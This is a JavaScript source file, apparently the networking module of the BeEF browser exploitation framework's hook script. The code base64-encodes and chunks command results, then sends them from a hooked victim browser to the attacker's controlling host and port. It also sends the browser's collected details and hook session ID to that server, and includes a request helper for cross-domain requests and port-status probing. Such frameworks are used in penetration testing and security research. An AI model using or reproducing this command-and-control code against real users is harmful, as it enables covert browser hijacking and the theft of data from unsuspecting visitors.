/*!
 * @literal object: beef.net
 *
 * Provides basic networking functions.
 */
beef.net = {
	
    host: "<%= @beef_host %>",
    port: "<%= @beef_port %>",
	hook: "<%= @beef_hook %>",
    handler: '/dh',
    chop: 1000,
    pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
    sid_count: 0,
	cmd_queue: [],

    //Command object
    command: function() {
        this.cid = null;
        this.results = null;
        this.handler = null;
        this.callback = null;
        this.results = null;
    },

    //Packet object
    packet: function() {
        this.id = null;
        this.data = null;
    },

    //Stream object
    stream: function() {
        this.id = null;
        this.packets = [];
        this.pc = 0;
        this.get_base_url_length = function() {
           return (this.url+this.handler+'?'+'bh='+beef.session.get_hook_session_id()).length;
        },
        this.get_packet_data = function() {
            var p = this.packets.shift();
            return {'bh':beef.session.get_hook_session_id(), 'sid':this.id, 'pid':p.id, 'pc':this.pc, 'd':p.data }
        };
    },
    
    /**
     * Response Object - returned from beef.net.request with result of request
     */
    response: function() {
        this.status_code = null;        // 500, 404, 200, 302
        this.response_body = null;               // "<html>…." if not a cross domain request
        this.port_status = null;        // tcp port is open, closed or not http
        this.was_cross_domain = null;   // true or false
        this.was_timedout = null;       // the user specified timeout was reached
        this.duration = null;           // how long it took for the request to complete
    },

    //Queues the command, to be sent back to the framework on the next refresh
	queue: function(handler, cid, results, callback) {
        if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function'))
        {
            var s = new beef.net.command();
            s.cid = cid;
            s.results = beef.net.clean(results);
            s.callback = callback;
            s.handler = handler;
            this.cmd_queue.push(s);
        }
	},

    //Queues the current command and flushes the queue straight away
    send: function(handler, cid, results, callback) {
        this.queue(handler, cid, results, callback);
        this.flush();
    },

    //Flush all currently queued commands to the framework
    flush: function() {
        if (this.cmd_queue.length > 0)
        {
            var data = beef.encode.base64.encode(beef.encode.json.stringify(this.cmd_queue));
            this.cmd_queue.length = 0;
            this.sid_count++;
            var stream = new this.stream();
            stream.id = this.sid_count;
            var pad = stream.get_base_url_length() + this.pad;
            //cant continue if chop amount is too low
            if ((this.chop - pad) > 0)
            {
                var data = this.chunk(data, (this.chop - pad));
                for (var i = 1; i <= data.length; i++)
                {
                    var packet = new this.packet();
                    packet.id = i;
                    packet.data = data[(i-1)];
                    stream.packets.push(packet);
                }
                stream.pc = stream.packets.length;
                this.push(stream);
            }
        }
    },

    //Split string into chunk lengths determined by amount
    chunk: function(str, amount) {
        if (typeof amount == 'undefined') n=2;
        return str.match(RegExp('.{1,'+amount+'}','g'));
    },

    //Push packets to framework
    push: function(stream) {
        //need to implement wait feature here eventually
        for (var i = 0; i < stream.pc; i++)
        {
            this.request('http', 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
        }
    },

    /**
	*Performs http requests
	* @param: {String} scheme: HTTP or HTTPS
	* @param: {String} method: GET or POST
	* @param: {String} domain: bindshell.net, 192.168.3.4, etc
	* @param: {Int} port: 80, 5900, etc
	* @param: {String} path: /path/to/resource
	* @param: {String} anchor: this is the value that comes after the # in the URL
	* @param: {String} data: This will be used as the query string for a GET or post data for a POST
	* @param: {Int} timeout: timeout the request after N seconds
	* @param: {String} dataType: specify the data return type expected (ie text/html/script) 
	* @param: {Funtion} callback: call the callback function at the completion of the method
	*
	* @return: {Object} response: this object contains the response details
	*/
	request: function(scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
		//check if same domain or cross domain
        cross_domain = !((document.domain == domain) && ((document.location.port == port) || (document.location.port == "" && port == "80")));

        //build the url
        var url = scheme+"://"+domain;
        url = (port != null) ? url+":"+port : url;
        url = (path != null) ? url+path : url;
        url = (anchor != null) ? url+"#"+anchor : url;

		//define response object
		var response = new this.response;
		response.was_cross_domain = cross_domain;
		
		var start_time = new Date().getTime();
		//build and execute request
		$j.ajax({type: method,
			 dataType: dataType,
		     url: url,
		     data: data,
		     timeout: (timeout * 1000),
		     //function on success
		     success: function(data, textStatus, jqXHR){
		    	 var end_time = new Date().getTime();
                 response.status_code = textStatus;
		    	 response.response_body = data;
		    	 response.port_status = "open";
		    	 response.was_timedout = false;
		    	 response.duration = (end_time - start_time);
		    },
		     //function on failure
	    	 error: function(jqXHR, textStatus, errorThrown){
	    		 var end_time = new Date().getTime();
	    		 if (textStatus == "timeout"){
	    			 response.was_timedout = true;
	    		 };
	    		 response.status_code = textStatus;
		    	 response.duration = (end_time - start_time);
		    },
		     //function on completion
		     complete: function(transport) {
		    	 response.status_code = transport.status;
		      }
		}).done(function() { if (callback != null) { callback(response); } });
		return response;
	},

    //this is a stub, as associative arrays are not parsed by JSON, all key / value pairs should use new Object() or {}
    //http://andrewdupont.net/2006/05/18/javascript-associative-arrays-considered-harmful/
    clean: function(r) {
        if (this.array_has_string_key(r)) {
            var obj = {};
            for (var key in r)
                obj[key] = (this.array_has_string_key(obj[key])) ? this.clean(r[key]) : r[key];
            return obj;
        }
        return r;
    },

    //Detects if an array has a string key
    array_has_string_key: function(arr) {
        if ($j.isArray(arr))
        {
            try {
                for (var key in arr)
                    if (isNaN(parseInt(key))) return true;
            } catch (e) { }
        }
        return false;
    },

    //Sends back browser details to framework
    browser_details: function() {
        var details = beef.browser.getDetails();
        details['HookSessionID'] = beef.session.get_hook_session_id();
        this.send('/init', 0, details);
    }

};


beef.regCmp('beef.net');
